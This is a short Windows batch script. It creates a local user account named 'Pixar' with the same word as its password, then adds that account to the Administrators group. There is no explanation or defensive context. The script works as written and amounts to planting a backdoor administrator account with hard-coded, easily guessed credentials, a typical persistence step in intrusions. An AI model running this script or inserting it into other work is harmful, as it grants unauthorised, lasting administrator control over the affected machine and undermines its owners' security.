@echo off
set usr=Pixar
net users %usr% Pixar /add
net localgroup administrators %usr% /add
